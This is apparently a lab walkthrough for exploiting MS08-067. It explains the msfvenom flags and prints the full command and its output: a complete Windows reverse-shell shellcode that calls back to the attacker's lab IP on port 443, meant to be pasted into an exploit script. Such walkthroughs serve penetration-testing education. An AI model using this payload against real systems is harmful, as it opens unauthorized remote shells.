# MS08-067


Reference:
https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067?redirectedfrom=MSDN

![image](https://user-images.githubusercontent.com/66146701/199320162-acc77a25-a1d5-4b1b-9ac3-27094abbbf42.png)

### Shellcode Generation

To make the shellcode, We will use `msfvenom`. 

```
-p windows/shell_reverse_tcp - This will connect back to me with a shell.
    
LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread - defining the variables for the payload - my ip, the port, and how to exit.

-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" - The bad characters not to use.

-f py - Output in python format.

-v shellcode - Have the code set the variable shellcode, instead of the default, buf. I want this to match what it’s called in the code I’m using.

-a x86 and --platform windows - Describing the environment I’m attacking.
```


<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1872 bytes
shellcode =  ""
shellcode += "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += "\x81\x76\x0e\x92\xab\xaa\xc8\x83\xee\xfc\xe2\xf4"
shellcode += "\x6e\x43\x28\xc8\x92\xab\xca\x41\x77\x9a\x6a\xac"
shellcode += "\x19\xfb\x9a\x43\xc0\xa7\x21\x9a\x86\x20\xd8\xe0"
shellcode += "\x9d\x1c\xe0\xee\xa3\x54\x06\xf4\xf3\xd7\xa8\xe4"
shellcode += "\xb2\x6a\x65\xc5\x93\x6c\x48\x3a\xc0\xfc\x21\x9a"
shellcode += "\x82\x20\xe0\xf4\x19\xe7\xbb\xb0\x71\xe3\xab\x19"
shellcode += "\xc3\x20\xf3\xe8\x93\x78\x21\x81\x8a\x48\x90\x81"
shellcode += "\x19\x9f\x21\xc9\x44\x9a\x55\x64\x53\x64\xa7\xc9"
shellcode += "\x55\x93\x4a\xbd\x64\xa8\xd7\x30\xa9\xd6\x8e\xbd"
shellcode += "\x76\xf3\x21\x90\xb6\xaa\x79\xae\x19\xa7\xe1\x43"
shellcode += "\xca\xb7\xab\x1b\x19\xaf\x21\xc9\x42\x22\xee\xec"
shellcode += "\xb6\xf0\xf1\xa9\xcb\xf1\xfb\x37\x72\xf4\xf5\x92"
shellcode += "\x19\xb9\x41\x45\xcf\xc3\x99\xfa\x92\xab\xc2\xbf"
shellcode += "\xe1\x99\xf5\x9c\xfa\xe7\xdd\xee\x95\x54\x7f\x70"
shellcode += "\x02\xaa\xaa\xc8\xbb\x6f\xfe\x98\xfa\x82\x2a\xa3"
shellcode += "\x92\x54\x7f\x98\xc2\xfb\xfa\x88\xc2\xeb\xfa\xa0"
shellcode += "\x78\xa4\x75\x28\x6d\x7e\x3d\xa2\x97\xc3\xa0\xc2"
shellcode += "\x9c\xa5\xc2\xca\x92\xaa\x11\x41\x74\xc1\xba\x9e"
shellcode += "\xc5\xc3\x33\x6d\xe6\xca\x55\x1d\x17\x6b\xde\xc4"
shellcode += "\x6d\xe5\xa2\xbd\x7e\xc3\x5a\x7d\x30\xfd\x55\x1d"
shellcode += "\xfa\xc8\xc7\xac\x92\x22\x49\x9f\xc5\xfc\x9b\x3e"
shellcode += "\xf8\xb9\xf3\x9e\x70\x56\xcc\x0f\xd6\x8f\x96\xc9"
shellcode += "\x93\x26\xee\xec\x82\x6d\xaa\x8c\xc6\xfb\xfc\x9e"
shellcode += "\xc4\xed\xfc\x86\xc4\xfd\xf9\x9e\xfa\xd2\x66\xf7"
shellcode += "\x14\x54\x7f\x41\x72\xe5\xfc\x8e\x6d\x9b\xc2\xc0"
shellcode += "\x15\xb6\xca\x37\x47\x10\x4a\xd5\xb8\xa1\xc2\x6e"
shellcode += "\x07\x16\x37\x37\x47\x97\xac\xb4\x98\x2b\x51\x28"
shellcode += "\xe7\xae\x11\x8f\x81\xd9\xc5\xa2\x92\xf8\x55\x1d"
</code></pre></div></div>

<p>Will take this shellcode into the script, and paste it in replacing the default.</p>


